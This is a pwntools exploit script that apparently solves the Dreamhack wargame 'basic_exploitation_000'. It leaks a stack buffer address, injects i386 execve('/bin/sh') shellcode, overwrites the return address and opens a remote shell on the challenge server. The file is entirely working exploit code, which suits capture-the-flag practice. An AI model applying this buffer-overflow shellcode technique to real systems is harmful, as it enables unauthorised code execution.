from pwn import *
from pwnlib.adb.adb import shell

if __name__ == "__main__":
    #io = process("./basic_exploitation_000")
    io = remote('host1.dreamhack.games',13330)
    buf = int(io.readline().split(b'(')[1][0:-2], 0)
    # this one is better cause navy said so ->
    #buf = buf[len("buf = ("):-2]
    bin = u32(b"/bin")
    sh = u32(b"/sh\0")
    shellcode = asm(f'''
    mov ebx, 0x3b
    sub ebx, 0x30
    mov eax, ebx
    push {sh}
    push {bin}
    mov ebx, esp
    mov ecx,0
    mov edx,0
    int 0x80
    mov eax, 0
    mov eax, [eax]
    ''',arch='i386')+b'\xcc'
    print(shellcode)
    rop = [
        shellcode,
        'A'*(0x84-len(shellcode)),
        buf
    ]
    print(hex(buf))
    io.sendline(flat(rop, arch='i386'))
    io.interactive()
